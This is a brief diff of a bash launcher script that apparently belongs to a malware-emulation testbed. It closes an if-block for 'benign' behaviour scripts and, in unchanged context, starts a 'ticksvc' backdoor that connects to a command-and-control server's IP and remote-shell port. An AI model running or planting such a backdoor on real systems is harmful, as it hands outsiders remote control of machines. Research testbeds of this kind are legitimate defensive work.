@@ -44,6 +44,7 @@ screen -dmS openSenseMap -L -Logfile ./logfile.txt $openSenseMap_folder/start_op
 if [ "$benign_process_active" = true ]; then
 	bash package_installation_behavior.sh
 	bash ping_behavior.sh 	
+fi
 
 # start listening for C&C server
 $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
